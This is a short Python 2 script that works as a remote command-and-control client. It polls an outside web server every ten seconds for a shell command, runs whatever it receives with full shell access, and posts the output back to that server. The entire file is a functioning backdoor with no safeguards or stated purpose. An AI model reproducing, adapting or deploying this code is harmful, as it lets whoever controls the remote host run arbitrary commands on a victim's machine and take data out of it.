#!/usr/bin/python
# -*- coding: utf8 -*-


import requests
import subprocess
import time
import uuid

base_url = "http://alfem.pythonanywhere.com/"
sleep_time=10


uid=uuid.uuid1()
print "SESSION ID", uid

ses = requests.Session()
ses.headers = {'sessionid':uid}

last_command=""

while True:
   resp=ses.get(base_url+"cmd",headers=ses.headers)
   
   print resp.status_code
   print resp.text   

   command=resp.text
   if command != "" and command != last_command:
       output=subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
       resp=ses.post(base_url+"cmd",data={"output":output},headers=ses.headers)
       print resp.status_code
       last_command=command
   
   print "Sleeping for",sleep_time,"seconds"
   time.sleep(sleep_time)
   
   
